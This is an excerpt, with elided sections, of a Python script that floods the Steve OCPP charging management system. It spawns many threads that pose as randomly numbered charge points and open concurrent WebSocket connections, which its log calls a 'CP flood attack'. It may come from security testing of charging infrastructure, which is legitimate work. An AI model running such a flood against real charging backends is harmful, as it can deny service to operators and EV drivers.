...
Spawns multiple parallel threads that connect as different charge points
and flood Steve with concurrent connection requests.
...
async def _worker(CP_ID):
    ws_url = f"{CSMS_URL}/CP_{CP_ID}"
    try:
...
def _thread_target():
    CP_ID = threading.current_thread().name.split("-")[-1]  # Extract CP_ID from thread name
    asyncio.run(_worker(CP_ID))


def main():
    logger.info("Starting CP Flood: %d threads @ %.1f Hz for %d s", NUM_THREADS, 1.0 / INTERVAL_S, DURATION_S)

    threads = []
    for _ in range(NUM_THREADS):
        CP_ID = random.randint(0, 9999)  # Unique CP ID per thread
        logger.info("Target: %s/%s", CSMS_URL, CP_ID)
        t = threading.Thread(target=_thread_target, name=f"Thread-{CP_ID}")
        t.start()
        threads.append(t)
    ...
    logger.info("CP flood attack completed")
